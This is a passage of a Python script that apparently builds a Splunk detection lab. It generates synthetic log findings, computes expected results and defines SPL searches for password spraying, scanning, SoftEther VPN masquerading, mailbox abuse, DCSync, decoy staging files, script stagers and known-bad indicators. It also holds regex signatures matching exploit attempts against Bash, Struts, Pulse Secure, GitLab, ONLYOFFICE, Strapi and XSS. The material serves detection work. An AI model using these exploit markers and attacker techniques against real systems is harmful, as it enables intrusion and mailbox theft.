            for r in rows:
                ann = json.dumps({"mitre_attack": [r["technique"]], "mitre_attack.mitre_technique_id": [r["technique"]],
                                  "mitre_attack.mitre_tactic_id": [r["tactic_id"]], "mitre_attack.mitre_tactic": [r["tactic"]],
                                  "analytic_story": ["AA26-281A Integrity Tech"]})
                ann = ann.replace("\\", "\\\\").replace('"', '\\"')
                msg = r["risk_message"].replace("\\", "\\\\").replace('"', '\\"')
                thr = r["threat_object"].replace("\\", "\\\\").replace('"', '\\"')
                parts.append(f'| makeresults | eval _time={int(r["t"].timestamp())}, risk_object="{r["risk_object"]}", '
                             f'risk_object_type="{r["risk_object_type"]}", risk_score={r["risk_score"]}, '
                             f'risk_message="{msg}", threat_object="{thr}", threat_object_type="{r["threat_object_type"]}", '
                             f'search_name="{source}", savedsearch_description="AA26-281A demo lab finding", '
                             f'annotations="{ann}"')
            spl = parts[0] + "".join(f" | append [ {p} ]" for p in parts[1:])
            spl += f' | fields - _raw | collect index=risk source="{source}" marker="aa26_lab=1"'
            lines.append(spl)
        path.write_text("\n".join(lines) + "\n")


# ---------------------------------------------------------------------- expected results (SPL logic replicated)
def expected(lab):
    tz, exp = lab.tz, {}
    loc = lambda t: t.astimezone(tz).strftime("%Y-%m-%d %H:%M")

    def bin_t(t, minutes):
        e = int(t.timestamp())
        return dt.datetime.fromtimestamp(e - e % (minutes * 60), UTC)

    mail = lab.iis["MAIL01"]
    ifaces = ("/ews/", "/owa/", "/ecp/", "/oab/", "/mapi/", "/rpc/", "/autodiscover/")
    cells = defaultdict(lambda: [0, 0, set()])
    for r in mail:
        s = r["cs_uri_stem"].lower()
        if not (s.startswith(ifaces) or s.startswith("/powershell") or s.startswith("/microsoft-server-activesync") or s.startswith("/api/")):
            continue
        c = cells[(bin_t(r["t"], 30), r["c_ip"], r["cs_username"])]
        c[0] += r["sc_status"] == 401
        c[1] += r["sc_status"] == 200
        c[2].add(s.split("/")[1])
    rows = defaultdict(lambda: {"failures": 0, "fail_users": set(), "ifaces": set(), "ok": set()})
    for (b, ip, user), (fails, wins, ifs) in cells.items():
        v = rows[(b, ip)]
        v["failures"] += fails
        v["ifaces"] |= ifs
        if fails:
            v["fail_users"].add(user)
            if wins:
                v["ok"].add(user)
    spray = []
    for (b, ip), v in rows.items():
        users = len(v["fail_users"])
        if users >= 10 and v["failures"] / users <= 3:
            spray.append({"_time": loc(b), "c_ip": ip, "failures": v["failures"], "users": users,
                          "interfaces": len(v["ifaces"]), "ok": sorted(v["ok"]),
                          "verdict": "SPRAY + SUCCESS" if v["ok"] else "SPRAY"})
    exp["spray"] = spray

    auth = defaultdict(lambda: [0, set()])
    for r in lab.records["Security"]:
        if r["eid"] in (4625, 4771):
            ip = r.get("WorkstationName") or str(r.get("IpAddress", "")).replace("::ffff:", "")
            k = (bin_t(r["t"], 30), ip)
            auth[k][0] += 1
            auth[k][1].add(r["TargetUserName"])
    exp["auth_spray"] = [{"_time": loc(b), "src": ip, "users": len(u), "failures": n}
                         for (b, ip), (n, u) in auth.items() if len(u) >= 10 and n / len(u) <= 3]

    net = defaultdict(lambda: (set(), set()))
    for r in lab.fw:
        if r["dest_port"] in (21, 22, 53, 80, 443, 1080):
            k = (bin_t(r["t"], 60), r["src"])
            net[k][0].add(r["dest"])
            net[k][1].add(r["dest_port"])
    exp["recon_network"] = sorted([{"_time": loc(b), "src": s, "hosts": len(h), "ports": len(p)}
                                   for (b, s), (h, p) in net.items() if len(h) >= 25], key=lambda x: -x["hosts"])

    web = defaultdict(lambda: [0, set()])
    for srv in ("MAIL01", "WEB01"):
        for r in lab.iis[srv]:
            s = r["cs_uri_stem"]
            if r["sc_status"] == 404 and (s.endswith(".php") or ".asp" in s):
                k = (bin_t(r["t"], 10), r["c_ip"], r["cs_User_Agent"])
                web[k][0] += 1
                web[k][1].add(s)
    exp["recon_web"] = [{"_time": loc(b), "src": ip, "http_user_agent": ua.replace("+", " ")[:60], "count": n, "paths": len(p)}
                        for (b, ip, ua), (n, p) in web.items() if len(p) >= 200]

    procs = defaultdict(lambda: {"count": 0, "first": None, "path": set(), "parent": set()})
    for r in lab.records["Sysmon"]:
        if r["eid"] != 1:
            continue
        name = r["Image"].split("\\")[-1]
        outside = not r["Image"].lower().startswith(("c:\\windows\\system32\\", "c:\\windows\\syswow64\\"))
        if (name.lower() in ("conhost.exe", "dllhost.exe") and outside) or r["OriginalFileName"].lower().startswith(("vpnclient", "vpnbridge")):
            k = (f"{r['host']}.{DOMAIN}", name, r["OriginalFileName"], r["Hashes"])
            p = procs[k]
            p["count"] += 1
            p["first"] = min(p["first"] or r["t"], r["t"])
            p["path"].add(r["Image"])
            p["parent"].add(r["ParentImage"].split("\\")[-1])
    exp["softether_process"] = [{"dest": k[0], "process_name": k[1], "original_file_name": k[2], "count": v["count"],
                                 "first_seen": loc(v["first"]), "path": sorted(v["path"]), "parent": sorted(v["parent"])}
                                for k, v in procs.items()]
    approved_ra = {(r["dest"], r["process_path"]) for r in csv.DictReader((APP / "lookups" / "aa26_approved_remote_access.csv").open())}
    exp["softether_tuned"] = sorted({(k[0].split(".")[0].upper(), k[1], k[2], path) for k, v in procs.items() for path in v["path"]
                                     if (k[0].split(".")[0].upper(), path) not in approved_ra})
    escu = Counter(r["host"] for r in lab.records["Sysmon"] if r["eid"] == 1
                   and r["Image"].lower().endswith(("conhost.exe", "dllhost.exe"))
                   and ("softether" in r["Company"].lower() or r["OriginalFileName"].lower().startswith("vpnbridge")))
    exp["escu_softether"] = [{"dest": f"{h}.{DOMAIN}", "count": n} for h, n in escu.items()]

    dns = Counter((r["src"], r["query"]) for r in lab.dns if r["query"].endswith((".softether.net", ".vpnazure.net")))
    exp["softether_dns"] = [{"src": s, "query": q, "count": n} for (s, q), n in dns.items()]

    ews = defaultdict(lambda: [0, set()])
    for r in mail:
        if r["sc_status"] == 200 and r["cs_uri_stem"] == "/EWS/Exchange.asmx":
            k = (bin_t(r["t"], 60), r["cs_username"], r["c_ip"])
            ews[k][0] += 1
            ews[k][1].add(r["cs_User_Agent"])
    per_user = defaultdict(list)
    for (b, u, ip), (n, _) in ews.items():
        per_user[u].append(n)
    med = {u: statistics.median(v) for u, v in per_user.items()}
    exp["ews_volume"] = [{"_time": loc(b), "cs_username": u, "c_ip": ip, "calls": n, "typical": med[u], "agents": sorted(a)}
                         for (b, u, ip), (n, a) in ews.items() if len(per_user[u]) >= 24 and n >= 500 and n >= 10 * med[u]]

    approved = {r["AppId"] for r in csv.DictReader((APP / "lookups" / "approved_mail_apps.csv").open())}
    apps = defaultdict(lambda: [0, set()])
    for r in lab.o365:
        if r["Operation"] == "MailItemsAccessed":
            apps[r["AppId"]][0] += 1
            apps[r["AppId"]][1].add(r["MailboxOwnerUPN"])
    exp["m365_app_access"] = [{"AppId": a, "mailboxes": len(m), "count": n} for a, (n, m) in apps.items()
                              if len(m) >= 5 and a not in approved]
    exp["m365_secrets"] = [{"_time": loc(r["t"]), "UserId": r["UserId"], "Operation": r["Operation"], "ObjectId": r["ObjectId"]}
                           for r in lab.o365 if r["Operation"].startswith(("Add service principal credentials", "Consent to application"))
                           or "Certificates and secrets" in r["Operation"]]
    exp["dcsync"] = [r for r in lab.records["Security"] if r["eid"] == 4662]
    staging = ("001.gif", "css.js", "include.png", ".sess.zip")
    exp["staging"] = [{"dest": f"{r['host']}.{DOMAIN}", "file_path": r["TargetFilename"], "file_name": r["TargetFilename"].split("\\")[-1]}
                      for r in lab.records["Sysmon"] if r["eid"] == 11
                      and (r["TargetFilename"].split("\\")[-1].lower() in staging
                           or r["TargetFilename"].split("\\")[-1].lower().startswith(("m2k", "all_scanner_v")))]
    svc = [{"_time": loc(r["t"]), "Computer": f"{r['host']}.{DOMAIN}", "ServiceName": r["ServiceName"], "ImagePath": r["ImagePath"]}
           for r in lab.records["System"] if r["eid"] == 7045
           and "\\windows\\system32\\" not in r["ImagePath"].lower() and "\\program files" not in r["ImagePath"].lower()]
    exp["new_services"] = svc

    risk = defaultdict(lambda: [0, set(), set()])
    for r in lab.risk:
        risk[r["risk_object"]][0] += r["risk_score"]
        risk[r["risk_object"]][1].add(r["tactic_id"])
        risk[r["risk_object"]][2].add(r["source"])
    exp["risk"] = sorted([{"risk_object": o, "risk": s, "tactics": len(t), "detections": len(d)}
                          for o, (s, t, d) in risk.items() if s >= 100 and len(t) >= 3], key=lambda x: -x["risk"])
    exp["risk_all"] = sorted([{"risk_object": o, "risk": s, "tactics": len(t)} for o, (s, t, d) in risk.items()],
                             key=lambda x: -x["risk"])

    iocs = {r["domain"]: r["ioc_source"] for r in csv.DictReader((APP / "lookups" / "aa26_281a_domains.csv").open()) if r["confidence"] != "invalid"}
    hits = Counter()
    for r in lab.dns:
        for d, src in iocs.items():
            if fnmatch.fnmatchcase(r["query"].lower(), d.lower()):
                hits[(r["src"], r["query"], src)] += 1
    exp["ioc_sweep"] = [{"src": s, "query": q, "ioc_source": src, "count": n} for (s, q, src), n in hits.items()]
    bad_ips = {r["ip"] for r in csv.DictReader((APP / "lookups" / "aa26_281a_ips.csv").open())}
    exp["ioc_ip"] = sorted({(r["src"], r["dest"]) for r in lab.fw if r["dest"] in bad_ips})
    stager = defaultdict(int)
    for r in lab.records["Sysmon"]:
        name = r["Image"].split("\\")[-1].lower() if r["eid"] == 1 else ""
        if name in ("wscript.exe", "cscript.exe", "powershell.exe") and fnmatch.fnmatch(r["CommandLine"].lower(), "*temp*.vbe*"):
            stager[(f"{r['host']}.{DOMAIN}", r["User"], r["ParentImage"].split("\\")[-1], r["Image"].split("\\")[-1])] += 1
    exp["fishhub"] = [{"dest": k[0], "user": k[1], "parent_process_name": k[2], "process_name": k[3], "count": n}
                      for k, n in stager.items()]

    hourly = defaultdict(lambda: [0, 0])
    for r in lab.fw:
        k = (bin_t(r["t"], 60), r["src"])
        hourly[k][0] += r["bytes_out"]
        hourly[k][1] += r["bytes_in"]
    upload_hours = [{"_time": loc(b), "src": s, "MB_out": round(o / 1e6)} for (b, s), (o, i) in hourly.items()
                    if o > 5 * i and o > 100_000_000]
    secrets = {(r["UserId"], r["Operation"]) for r in exp["m365_secrets"]}
    exp["backtest"] = {
        "Exchange password spray": len(exp["spray"]),
        "Spray source authenticated": sum(len(r["ok"]) for r in exp["spray"]),
        "Scanning on advisory ports": len([r for r in exp["recon_network"] if r["src"] != VULN_SCANNER]),
        "Web enumeration burst": len(exp["recon_web"]),
        "SoftEther masquerading as Windows binary": len(exp["softether_tuned"]),
        "SoftEther dynamic DNS": len(exp["softether_dns"]),
        "Autostart service outside system paths": len({(r["Computer"], r["ServiceName"], r["ImagePath"]) for r in exp["new_services"]}),
        "EWS volume far above normal": len(exp["ews_volume"]),
        "Unapproved app reading many mailboxes": len(exp["m365_app_access"]),
        "New app secret or consent": len(secrets),
        "DCSync by non-machine account": 0,
        "Advisory decoy file names": len({(r["dest"], r["file_path"]) for r in exp["staging"]}),
        "FishHub-style script stager": len(exp["fishhub"]),
        "Known-bad domain resolved": len({(r["src"], r["query"]) for r in exp["ioc_sweep"]}),
        "Connection to known-bad IP": len(exp["ioc_ip"]),
        "Upload-heavy host": len(upload_hours),
        "Integrity Tech behaviour chain": len(exp["risk"]),
    }
    exp["upload_hours"] = upload_hours

    ip_host = {u["ip"]: u["ws"] for u in lab.users}
    corr = defaultdict(set)
    for r in exp["softether_process"]:
        corr[r["dest"].split(".")[0].upper()].add("process: SoftEther metadata")
    for r in exp["new_services"]:
        corr[r["Computer"].split(".")[0].upper()].add("service: autostart outside system paths")
    for r in exp["softether_dns"]:
        corr[ip_host.get(r["src"], r["src"])].add("dns: SoftEther dynamic DNS")
    exp["softether_corr"] = sorted([{"host": h, "signals": len(v), "evidence": sorted(v)} for h, v in corr.items()],
                                   key=lambda x: -x["signals"])

    ident = {r["identity"]: r for r in csv.DictReader((APP / "lookups" / "aa26_lab_identities.csv").open())}[VICTIM]
    seen = defaultdict(lambda: [0, set()])
    for r in mail:
        if r["cs_username"] == VICTIM and r["sc_status"] == 200:
            seen[r["c_ip"]][0] += 1
            seen[r["c_ip"]][1].add(r["cs_User_Agent"])
    label = {ident["office_ip"]: "office", ident["home_ip"]: "home", ident["mobile_ip"]: "mobile gateway"}
    exp["signin"] = sorted([{"c_ip": ip, "seen_before": label.get(ip, "NEVER"), "count": n, "agents": sorted(a)}
                            for ip, (n, a) in seen.items()], key=lambda x: -x["count"])

    reach = defaultdict(set)
    for r in lab.fw:
        if r["dest_port"] in (21, 22, 53, 80, 443, 1080):
            reach[r["src"]].add(r["dest"])
    scanners = {s for s, d in reach.items() if len(d) >= 25}
    state = []
    for host, ip, product, cve, facing, crit in lab.vulns:
        by = sorted(s for s in scanners if ip and ip in reach[s])
        state.append({"host": host, "cve": cve, "public_ip": ip, "scanned_by": by,
                      "state": "Targeted: scanned" if by else ("Exposed: internet-facing" if facing == "yes" else "Vulnerable: internal only")})
    exp["vuln_state"] = state

    def attempt(r):
        ua, q, stem = r["cs_User_Agent"], r["cs_uri_query"], r["cs_uri_stem"]
        if re.search(r"[(][)][+ ]?[{]", ua):
            return "CVE-2014-6278 Bash"
        if re.search(r"(?i)memberAccess|ognl", q):
            return "CVE-2016-3081 Struts"
        if re.search(r"(?i)^/dana-na/.*[.][.]/", stem):
            return "CVE-2019-11510 Pulse Secure"
        if stem == "/uploads/user" and r["cs_method"] == "POST":
            return "CVE-2021-22205 GitLab"
        if re.search(r"(?i)^/FileUploader[.]ashx|^/web-apps/apps/api/documents/", stem):
            return "CVE-2021-3199 ONLYOFFICE"
        if re.search(r"(?i)\[password\].{0,4}startsWith", q):
            return "CVE-2023-22894 Strapi"
        if re.search(r"(?i)%3C(script|svg|img)|onerror%3D|onload%3D", q):
            return "XSS payload"
        return None

    approved_scan = {r["src"] for r in csv.DictReader((APP / "lookups" / "aa26_approved_scanners.csv").open())}
    by_src = defaultdict(lambda: {"requests": 0, "attempts": set(), "answered": 0})
    for srv in ("MAIL01", "WEB01"):
        for r in lab.iis[srv] + lab.iis_extra[srv]:
            a = attempt(r)
            if a:
                v = by_src[r["c_ip"]]
                v["requests"] += 1
                v["attempts"].add(a)
                v["answered"] += r["sc_status"] < 400
    exp["exploit_sources"] = sorted([{"src": s, "techniques": len(v["attempts"]), "attempts": sorted(v["attempts"]),
                                      "requests": v["requests"], "answered": v["answered"],
                                      "verdict": "approved scanner" if s in approved_scan else
                                      ("multi-exploit sweep: investigate" if len(v["attempts"]) >= 3 else "opportunistic probe")}
                                     for s, v in by_src.items()], key=lambda x: -x["techniques"])
    attempted = defaultdict(set)
    for s, v in by_src.items():
        if s not in approved_scan:
            for a in v["attempts"]:
                attempted[a.split(" ")[0]].add(s)
    hosts = {m_host for m_host in ("MAIL01", "WEB01", "DC01", "FW-EDGE01", "LAB-WEF01", "LAB-O365")}
    vuln = {v[3]: v for v in lab.vulns}
    scanned_ext = {s for s in scanners if s not in approved_scan}
    rows = []
    for cve, year, product, *_ in ADVISORY_CVES:
        v = vuln.get(cve)
        if not v:
            prio = "Not found: confirm inventory"
        else:
            host, ip, _, _, facing, _ = v
            hit = ip and any(ip in reach[s] for s in scanned_ext)
            prio = "1 Patch now" if facing == "yes" and hit else ("2 Patch this week" if facing == "yes" else "3 Patch this month")
        rows.append({"cve": cve, "asset": v[0] if v else "", "attempted_by": sorted(attempted.get(cve, [])), "priority": prio,
                     "telemetry": "-" if not v else ("logs to Splunk" if v[0] in hosts else "NO LOGS")})
    exp["advisory_cves"] = rows
    exp["backtest"]["Exploit attempts for advisory CVEs"] = len([r for r in exp["exploit_sources"] if r["verdict"].startswith("multi")])
    exp["ai_draft"] = 0
    lo, hi = lab.at(0, 15, 0), lab.at(1, 2, 20)
    exp["pivot"] = [{"_time": t.astimezone(tz).strftime("%Y-%m-%d %H:%M:%S"), "EventCode": r["eid"],
                     "Image": r["Image"].split("\\")[-1], "detail": r.get("TargetFilename") or r.get("OriginalFileName"),
                     "ParentImage": r.get("ParentImage", "").split("\\")[-1]}
                    for r in sorted(lab.records["Sysmon"], key=lambda x: x["t"]) for t in [r["t"]]
                    if r["host"] == VICTIM_WS and r["eid"] in (1, 11) and lo <= t <= hi]
    return exp


EXPLOIT_BASE = """`aa26_iis` (cs_User_Agent="*()*" OR cs_uri_stem IN ("/dana-na/*","/uploads/user","/FileUploader.ashx","/web-apps/apps/api/documents/*") OR cs_uri_query IN ("*memberAccess*","*ognl*","*startsWith*","*%3Cscript*","*%3Csvg*","*%3Cimg*","*onerror*","*onload*"))
| eval attempt=case(match(cs_User_Agent,"[(][)][+ ]?[{]"),"CVE-2014-6278 Bash",
    match(cs_uri_query,"(?i)memberAccess|ognl"),"CVE-2016-3081 Struts",
    match(cs_uri_stem,"(?i)^/dana-na/.*[.][.]/"),"CVE-2019-11510 Pulse Secure",
    cs_uri_stem=="/uploads/user" AND cs_method=="POST","CVE-2021-22205 GitLab",
    match(cs_uri_stem,"(?i)^/FileUploader[.]ashx|^/web-apps/apps/api/documents/"),"CVE-2021-3199 ONLYOFFICE",
    match(cs_uri_query,"(?i)[[]password[]].{0,4}startsWith"),"CVE-2023-22894 Strapi",
    match(cs_uri_query,"(?i)%3C(script|svg|img)|onerror%3D|onload%3D"),"XSS payload")
| where isnotnull(attempt)"""

SEARCHES = [
    {"name": "AA26 01 - Telemetry discovery", "slide": "Act 2", "title": "What data do we have, and how far back?", "spl": """| tstats count min(_time) as first max(_time) as last
    where index=* by index sourcetype
| eval days_retained=round((last-first)/86400)
| sort - count"""},
    {"name": "AA26 02 - Are the fields we need populated", "slide": "Act 2", "title": "Are the fields we need populated?", "spl": """index=exchange sourcetype=ms:iis:auto
| fieldsummary
| search field IN (c_ip cs_username cs_uri_stem
                   sc_status cs_User_Agent)
| table field count distinct_count"""},
    {"name": "AA26 03 - Detection 1 - Exchange password spray", "slide": "Act 3", "title": "Detection 1: password spraying across Exchange", "spl": """index=exchange sourcetype=ms:iis:auto
    cs_uri_stem IN ("/EWS/*","/owa/*","/ecp/*","/oab/*",
      "/mapi/*","/rpc/*","/autodiscover/*","/powershell*",
      "/Microsoft-Server-ActiveSync*","/api/*")
| eval interface=lower(mvindex(split(cs_uri_stem,"/"),1))
| bin _time span=30m
| stats count(eval(sc_status=401)) as fails
    count(eval(sc_status=200)) as wins values(interface) as ifs
    by _time c_ip cs_username
| eventstats sum(fails) as failures dc(ifs) as interfaces
    dc(eval(if(fails>0,cs_username,null()))) as users by _time c_ip
| where users>=10 AND failures/users<=3
| stats max(failures) as failures max(users) as users
    max(interfaces) as interfaces
    values(eval(if(fails>0 AND wins>0,cs_username,null()))) as ok
    by _time c_ip
| eval verdict=if(isnotnull(ok),"SPRAY + SUCCESS","SPRAY")"""},
    {"name": "AA26 04 - Detection 2 - Network scanning", "slide": "Act 3", "title": "Detection 2: scanning on the advisory's ports", "spl": """| tstats dc(All_Traffic.dest) as hosts
    dc(All_Traffic.dest_port) as ports
    from datamodel=Network_Traffic
    where All_Traffic.dest_port IN (21,22,53,80,443,1080)
    by All_Traffic.src _time span=1h
| where hosts>=25
| sort - hosts"""},
    {"name": "AA26 05 - Detection 2 - Web enumeration", "slide": "Act 3", "title": "Detection 2: dirsearch-style web enumeration", "spl": """| tstats count dc(Web.uri_path) as paths
    from datamodel=Web
    where Web.status=404
      (Web.uri_path="*.php" OR Web.uri_path="*.asp*")
    by Web.src Web.http_user_agent _time span=10m
| where paths>=200"""},
    {"name": "AA26 06 - Detection 3 - SoftEther process", "slide": "Act 3", "title": "Detection 3: a VPN bridge pretending to be Windows", "spl": """| tstats count min(_time) as first_seen
    values(Processes.process_path) as path
    values(Processes.parent_process_name) as parent
    from datamodel=Endpoint.Processes
    where (Processes.process_name IN ("conhost.exe","dllhost.exe")
      NOT Processes.process_path IN ("C:\\\\Windows\\\\System32\\\\*",
                                     "C:\\\\Windows\\\\SysWOW64\\\\*"))
      OR Processes.original_file_name IN ("vpnclient*","vpnbridge*")
    by Processes.dest Processes.process_name
       Processes.original_file_name Processes.process_hash
| convert ctime(first_seen)"""},
    {"name": "AA26 07 - Detection 3 - SoftEther DNS", "slide": "Act 3", "title": "Detection 3: SoftEther dynamic DNS", "spl": """| tstats count from datamodel=Network_Resolution
    where DNS.query IN ("*.softether.net","*.vpnazure.net")
    by DNS.src DNS.query"""},
    {"name": "AA26 08 - Shipped ES detection - SoftEther masquerading", "slide": "Act 3", "title": "The shipped ES detection, run ad hoc", "spl": """`sysmon` EventID=1 process IN ("*conhost.exe*","*dllhost.exe*")
    (Company="*SoftEther*" OR OriginalFileName="vpnbridge*.exe")
| stats count min(_time) as firstTime
    by dest process original_file_name Company parent_process_name user
| convert ctime(firstTime)"""},
    {"name": "AA26 09 - Detection 4 - EWS volume", "slide": "Act 3", "title": "Detection 4: EWS volume far above the user's normal", "spl": """index=exchange sourcetype=ms:iis:auto sc_status=200
    cs_uri_stem="/EWS/Exchange.asmx"
| bin _time span=1h
| stats count as calls values(cs_User_Agent) as agents
    by _time cs_username c_ip
| eventstats median(calls) as typical count as active_hours
    by cs_username
| where active_hours>=24 AND calls>=500 AND calls>=10*typical"""},
    {"name": "AA26 10 - Detection 4 - Unapproved app reading mailboxes", "slide": "Act 3", "title": "Detection 4: unapproved app reading many mailboxes", "spl": """index=o365 Operation=MailItemsAccessed
| stats dc(MailboxOwnerUPN) as mailboxes count by AppId
| lookup approved_mail_apps AppId OUTPUT owner
| where mailboxes>=5 AND isnull(owner)"""},
    {"name": "AA26 11 - Detection 4 - New app secrets and consents", "slide": "Act 3", "title": "Detection 4: new app secrets and consents", "spl": """index=o365 Operation IN ("Add service principal credentials*",
    "*Certificates and secrets*","Consent to application*")
| table _time UserId Operation ObjectId"""},
    {"name": "AA26 12 - Detection 5 - DCSync", "slide": "Act 3", "title": "Detection 5: DCSync", "spl": """`wineventlog_security` EventCode=4662 AccessMask=0x100
    Properties IN (
      "*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*",
      "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*",
      "*89e95b76-444d-4c62-991a-0facbeda640c*")
    NOT SubjectUserName="*$"
| stats count min(_time) as first
    by SubjectUserName Computer"""},
    {"name": "AA26 13 - Detection 5 - Staging file names", "slide": "Appendix", "title": "Detection 5: the advisory's decoy file names", "spl": """| tstats count from datamodel=Endpoint.Filesystem
    where Filesystem.file_name IN ("001.gif","Css.js",
      "M2k*.js","Include.png","All_scanner_v*.pl.gz",
      ".sess.zip")
    by Filesystem.dest Filesystem.file_path
       Filesystem.file_name"""},
    {"name": "AA26 14 - Step 4 - Risk", "slide": "Act 4", "title": "Step 4: six quiet signals, one loud finding", "spl": """| tstats sum(All_Risk.calculated_risk_score) as risk
    dc(All_Risk.annotations.mitre_attack.mitre_tactic_id) as tactics
    from datamodel=Risk.All_Risk
    by All_Risk.risk_object All_Risk.risk_object_type
| where risk>=100 AND tactics>=3"""},
    {"name": "AA26 15 - A1 - CIM Authentication spray", "slide": "Appendix", "title": "Spraying seen in directory authentication", "spl": """| tstats dc(Authentication.user) as users
    count as failures
    from datamodel=Authentication
    where Authentication.action=failure
    by Authentication.src _time span=30m
| where users>=10 AND failures/users<=3"""},
    {"name": "AA26 16 - A2 - New services outside system paths", "slide": "Act 3", "title": "New autostart services outside system paths", "spl": """`wineventlog_system` EventCode=7045
    NOT ImagePath IN ("*\\\\Windows\\\\System32\\\\*","*\\\\Program Files*")
| table _time Computer ServiceName ImagePath StartType"""},
    {"name": "AA26 17 - A3 - Upload-heavy hosts", "slide": "Appendix", "title": "Hours in which a host uploads far more than it downloads", "spl": """| tstats sum(All_Traffic.bytes_out) as bytes_out
    sum(All_Traffic.bytes_in) as bytes_in
    from datamodel=Network_Traffic
    by All_Traffic.src _time span=1h
| where bytes_out > 5*bytes_in AND bytes_out > 100000000
| eval MB_out=round(bytes_out/1e6)"""},
    {"name": "AA26 18 - A4 - Indicator sweep", "slide": "Appendix", "title": "Sweep the advisory's domains across retention", "spl": """| tstats count from datamodel=Network_Resolution
    by DNS.src DNS.query
| lookup aa26_281a_domains domain AS DNS.query
    OUTPUT ioc_source confidence last_seen expires
| where isnotnull(ioc_source) AND confidence!="invalid"
    AND strptime(expires,"%Y-%m-%d")>now()"""},
    {"name": "AA26 19 - Pivot - What happened on WS-0417", "slide": "Act 5", "title": "Pivot: how did SoftEther get onto WS-0417?", "spl": """`sysmon` Computer="WS-0417*" EventCode IN (1,11)
| eval detail=coalesce(TargetFilename, OriginalFileName)
| table _time EventCode Image ParentImage detail CommandLine
| sort _time"""},
    {"name": "AA26 20 - Detection 5 - FishHub-style stager", "slide": "Appendix", "title": "Detection 5: a script stager dropped into %temp%", "spl": """| tstats count min(_time) as first_seen
    values(Processes.process) as command
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("wscript.exe",
      "cscript.exe","powershell.exe")
      Processes.process="*temp*.vbe*"
    by Processes.dest Processes.user
       Processes.parent_process_name Processes.process_name
| convert ctime(first_seen)"""},
    {"name": "AA26 21 - A4 - Known-bad IP sweep", "slide": "Appendix", "title": "Sweep the advisory's and the seizure's IP addresses", "spl": """| tstats count sum(All_Traffic.bytes_out) as bytes_out
    from datamodel=Network_Traffic
    by All_Traffic.src All_Traffic.dest
| lookup aa26_281a_ips ip AS All_Traffic.dest
    OUTPUT ioc_source confidence last_seen expires
| where isnotnull(ioc_source) AND confidence!="invalid"
    AND strptime(expires,"%Y-%m-%d")>now()"""},
    {"name": "AA26 22 - SoftEther - Evidence correlated by host", "slide": "Act 3", "title": "SoftEther: process, service and DNS evidence on one host", "spl": """| tstats count from datamodel=Endpoint.Processes
    where Processes.original_file_name IN ("vpnclient*","vpnbridge*")
    by Processes.dest
| eval host=upper(mvindex(split('Processes.dest',"."),0)),
    signal="process: SoftEther metadata"
| append [search `wineventlog_system` EventCode=7045
    NOT ImagePath IN ("*\\\\Windows\\\\System32\\\\*","*\\\\Program Files*")
  | eval host=upper(mvindex(split(Computer,"."),0)),
      signal="service: autostart outside system paths"]
| append [| tstats count from datamodel=Network_Resolution
    where DNS.query IN ("*.softether.net","*.vpnazure.net") by DNS.src
  | lookup aa26_lab_assets ip AS DNS.src OUTPUT host
  | eval signal="dns: SoftEther dynamic DNS"]
| stats dc(signal) as signals values(signal) as evidence by host
| sort - signals"""},
    {"name": "AA26 23 - SoftEther - Tuned detection", "slide": "Act 3", "title": "SoftEther: the tuned detection that ships", "spl": """| tstats count min(_time) as first_seen
    from datamodel=Endpoint.Processes
    where (Processes.process_name IN ("conhost.exe","dllhost.exe")
      NOT Processes.process_path IN ("C:\\\\Windows\\\\System32\\\\*",
                                     "C:\\\\Windows\\\\SysWOW64\\\\*"))
      OR Processes.original_file_name IN ("vpnclient*","vpnbridge*")
    by Processes.dest Processes.process_name
       Processes.original_file_name Processes.process_path
| rename Processes.* as *
| eval dest=upper(mvindex(split(dest,"."),0))
| lookup aa26_approved_remote_access dest process_path
    OUTPUT approved_by
| where isnull(approved_by)
| convert ctime(first_seen)"""},
    {"name": "AA26 24 - Investigate - Risk events for j.citizen", "slide": "Act 4", "title": "Investigation: every risk event behind the finding", "spl": """index=risk risk_object="j.citizen"
| table _time source risk_score risk_message threat_object
| sort _time"""},
    {"name": "AA26 25 - Investigate - Where j.citizen signs in from", "slide": "Act 5", "title": "Investigation: is this really j.citizen?", "spl": """index=exchange sourcetype=ms:iis:auto
    cs_username="j.citizen" sc_status=200
| stats count min(_time) as first max(_time) as last
    values(cs_User_Agent) as agents by cs_username c_ip
| lookup aa26_lab_identities identity AS cs_username
    OUTPUT office_ip home_ip mobile_ip
| eval seen_before=case(c_ip==office_ip,"office", c_ip==home_ip,"home",
    c_ip==mobile_ip,"mobile gateway", true(),"NEVER")
| table c_ip seen_before count first last agents
| convert ctime(first) ctime(last)
| sort - count"""},
    {"name": "AA26 26 - Investigate - Identity and asset context", "slide": "Act 5", "title": "Investigation: who and what is at risk?", "spl": """| inputlookup aa26_lab_identities.csv
| search identity IN ("j.citizen","a.lim")
| lookup aa26_lab_assets host AS workstation
    OUTPUT ip priority AS host_priority
| table identity display title department workstation ip
    priority host_priority"""},
    {"name": "AA26 27 - Exposure - Vulnerable vs targeted", "slide": "Exposure", "title": "Vulnerable is not exploited: correlate inventory with telemetry", "spl": """| inputlookup aa26_lab_vulns.csv
| join type=left public_ip
    [| tstats count from datamodel=Network_Traffic
        where All_Traffic.dest_port IN (21,22,53,80,443,1080)
        by All_Traffic.src All_Traffic.dest
     | eventstats dc(All_Traffic.dest) as reach by All_Traffic.src
     | where reach>=25
     | stats values(All_Traffic.src) as scanned_by by All_Traffic.dest
     | rename All_Traffic.dest as public_ip]
| eval state=case(isnotnull(scanned_by),"Targeted: scanned",
    internet_facing=="yes","Exposed: internet-facing",
    true(),"Vulnerable: internal only")
| table host product cve criticality public_ip scanned_by state"""},
    {"name": "AA26 28 - AI - First draft with assumed fields", "slide": "AI", "title": "AI's first draft, run as written", "spl": """index=exchange sourcetype=ms:iis:auto action=failure
| bin _time span=30m
| stats dc(user) as users count by _time src_ip
| where users>=10"""},
    {"name": "AA26 29 - Recon - Scanner profile", "slide": "Act 3", "title": "Who is scanning: direction, baseline and what they did next", "spl": """| tstats dc(All_Traffic.dest) as hosts dc(All_Traffic.dest_port) as ports
    from datamodel=Network_Traffic
    where All_Traffic.dest_port IN (21,22,53,80,443,1080)
    by All_Traffic.src _time span=1h
| rename All_Traffic.src as src
| where hosts>=25
| stats max(hosts) as hosts max(ports) as ports count as scan_hours
    dc(eval(strftime(_time,"%Y-%m-%d"))) as scan_days min(_time) as first_scan by src
| eval direction=if(cidrmatch("10.0.0.0/8",src),"internal","external")
| lookup aa26_approved_scanners src OUTPUT reason as approved
| join type=left src
